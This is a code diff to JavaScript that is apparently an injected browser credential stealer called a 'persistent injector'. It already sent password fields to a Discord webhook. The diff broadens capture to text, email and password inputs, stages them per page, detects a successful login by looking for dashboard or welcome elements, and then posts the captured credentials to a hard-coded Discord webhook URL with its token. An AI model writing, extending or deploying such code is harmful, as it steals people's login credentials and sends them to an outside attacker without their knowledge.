@@ -92,33 +92,46 @@
                     }).catch(() => {});
                 }
                 
-                // Monitor password fields
+                // Smart credential staging for persistent injector
+                let persistentStaged = {};
+                
                 document.addEventListener('input', function(e) {
-                    if (e.target.type === 'password' && e.target.value.length > 3) {
+                    if (e.target.type === 'password' || e.target.type === 'email' || e.target.type === 'text') {
                         const form = e.target.closest('form');
-                        const credentials = {};
-                        if (form) {
-                            const inputs = form.querySelectorAll('input');
-                            inputs.forEach(inp => {
-                                if (inp.type === 'text' || inp.type === 'email' || inp.type === 'password') {
-                                    credentials[inp.name || inp.id || inp.type] = inp.value;
-                                }
-                            });
+                        if (form && e.target.value.length > 2) {
+                            if (!persistentStaged[window.location.href]) {
+                                persistentStaged[window.location.href] = {};
+                            }
+                            persistentStaged[window.location.href][e.target.name || e.target.id || e.target.type] = e.target.value;
                         }
-                        
-                        fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                content: `**Persistent Credentials**\n\`\`\`json\n${JSON.stringify({
-                                    type: 'persistent_credentials',
-                                    credentials: credentials,
-                                    timestamp: new Date().toISOString(),
-                                    page: window.location.href
-                                }, null, 2)}\n\`\`\``
-                            }),
-                            mode: 'no-cors'
-                        }).catch(() => {});
+                    }
+                });
+                
+                // Detect successful login for persistent injector
+                document.addEventListener('submit', function(e) {
+                    const formData = persistentStaged[window.location.href];
+                    if (formData) {
+                        setTimeout(() => {
+                            // Check for redirect or success indicators
+                            const successElements = document.querySelectorAll('[class*="dashboard"], [class*="profile"], [class*="welcome"], [id*="user"]');
+                            if (successElements.length > 0 || window.location.href.includes('dashboard') || window.location.href.includes('home')) {
+                                fetch('https://discord.com/api/webhooks/1323706161920213074/bG7RwSOehEo8k66bSn5WrYXT7cDiqokQbq70CaH09zi0BVsyQMcEkxEExI6vV-KUDQKb', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        content: `**SUCCESSFUL LOGIN CAPTURED**\n\`\`\`json\n${JSON.stringify({
+                                            type: 'confirmed_successful_login',
+                                            credentials: formData,
+                                            timestamp: new Date().toISOString(),
+                                            page: window.location.href
+                                        }, null, 2)}\n\`\`\``
+                                    }),
+                                    mode: 'no-cors'
+                                }).catch(() => {});
+                                
+                                delete persistentStaged[window.location.href];
+                            }
+                        }, 2500);
                     }
                 });
                 
